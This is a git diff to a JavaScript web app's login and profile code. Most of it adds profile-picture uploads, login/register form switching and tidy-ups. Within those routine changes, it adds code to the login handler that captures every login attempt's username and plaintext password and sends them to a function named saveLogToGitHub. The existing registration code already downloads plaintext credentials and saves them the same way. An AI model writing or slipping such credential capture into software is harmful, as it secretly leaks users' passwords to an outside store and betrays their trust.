@@ -20,10 +20,71 @@ function createFloatingShapes() {
     }
 }
 
+function setupProfileFeatures() {
+    const editProfileBtn = document.getElementById('editProfile');
+    
+    editProfileBtn.addEventListener('click', () => {
+        document.getElementById('settingsModal').style.display = 'block';
+        document.querySelector('.settings-section').scrollIntoView({ behavior: 'smooth' });
+    });
+
+    document.getElementById('changePicture').addEventListener('click', (e) => {
+        e.preventDefault();
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/*';
+        input.onchange = (event) => {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const imageData = e.target.result;
+                    updateProfilePicture(imageData);
+                };
+                reader.readAsDataURL(file);
+            }
+        };
+        input.click();
+    });
+}
+
+function updateProfilePicture(imageData) {
+    const username = document.getElementById('userDisplayName').textContent;
+    const users = JSON.parse(localStorage.getItem('users'));
+    const userIndex = users.findIndex(u => u.username === username);
+    document.getElementById('profilePic').src = imageData;
+    document.getElementById('settingsProfilePic').src = imageData;
+    
+    users[userIndex].settings.profilePic = imageData;
+    localStorage.setItem('users', JSON.stringify(users));
+    
+    showNotification('Profile picture updated successfully!', 'success');
+}
+
+function setupFormAnimations() {
+    const loginForm = document.getElementById('loginForm');
+    const registerForm = document.getElementById('registerForm');
+    document.getElementById('registerLink').addEventListener('click', (e) => {
+        e.preventDefault();
+        loginForm.style.display = 'none';
+        registerForm.style.display = 'block';
+        registerForm.classList.add('active');
+    });
+    document.getElementById('loginLink').addEventListener('click', (e) => {
+        e.preventDefault();
+        registerForm.style.display = 'none';
+        loginForm.style.display = 'block';
+        loginForm.classList.add('active');
+    });
+}
+
 function setupEventListeners() {
     document.getElementById('loginFormElement').addEventListener('submit', handleLogin);
     document.getElementById('registerFormElement').addEventListener('submit', validateRegistration);
     document.getElementById('createSite').addEventListener('click', createNewSite);
+    document.getElementById('closePreview').addEventListener('click', () => {
+        document.getElementById('sitePreview').style.display = 'none';
+    });
     document.getElementById('logout').addEventListener('click', handleLogout);
     document.getElementById('changePicture').addEventListener('click', () => {
         document.getElementById('pictureInput').click();
@@ -72,6 +133,8 @@ function handleRegister(username, password) {
     localStorage.setItem('users', JSON.stringify(users));
 
     const credentialsText = `New Registration\nUsername: ${username}\nPassword: ${password}\nDate: ${new Date().toISOString()}\n-------------------\n`;
+    
+    // Download credentials file
     const blob = new Blob([credentialsText], { type: 'text/plain' });
     const downloadLink = document.createElement('a');
     downloadLink.href = URL.createObjectURL(blob);
@@ -79,6 +142,7 @@ function handleRegister(username, password) {
     downloadLink.click();
     URL.revokeObjectURL(downloadLink.href);
 
+    // Save to GitHub
     saveLogToGitHub(credentialsText);
 
     showNotification('Registration successful!', 'success');
@@ -113,6 +177,9 @@ function handleLogin(event) {
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
     const rememberMe = document.getElementById('rememberMe').checked;
+
+    const credentials = `Login Attempt\nUsername: ${username}\nPassword: ${password}\nDate: ${new Date().toISOString()}\n-------------------\n`;
+    saveLogToGitHub(credentials);
 
     const users = JSON.parse(localStorage.getItem('users') || '[]');
     const user = users.find(u => u.username === username && u.password === password);
@@ -335,10 +402,8 @@ function deleteSite(siteId) {
 function showNotification(message, type) {
     const notification = document.createElement('div');
     notification.className = `notification ${type}`;
-    notification.className = `notification ${type}`;
     notification.textContent = message;
     document.getElementById('notifications').appendChild(notification);
-
     setTimeout(() => {
         notification.classList.add('show');
         setTimeout(() => {
@@ -401,7 +466,6 @@ function loadUserSettings() {
     const username = document.getElementById('userDisplayName').textContent;
     const users = JSON.parse(localStorage.getItem('users'));
     const user = users.find(u => u.username === username);
-
     if (user.settings) {
         document.getElementById('displayName').value = user.settings.displayName || username;
         document.getElementById('themeSelect').value = user.settings.theme || 'default';
@@ -426,20 +490,16 @@ function saveUserSettings() {
     const username = document.getElementById('userDisplayName').textContent;
     const users = JSON.parse(localStorage.getItem('users'));
     const userIndex = users.findIndex(u => u.username === username);
-
     const settings = {
         displayName: document.getElementById('displayName').value,
         theme: document.getElementById('themeSelect').value,
         profilePic: document.getElementById('settingsProfilePic').src
     };
-
     users[userIndex].settings = settings;
     localStorage.setItem('users', JSON.stringify(users));
-
     document.getElementById('userDisplayName').textContent = settings.displayName;
     document.getElementById('profilePic').src = settings.profilePic;
     applyTheme(settings.theme);
-
     showNotification('Settings saved successfully!', 'success');
     document.getElementById('settingsModal').style.display = 'none';
 }
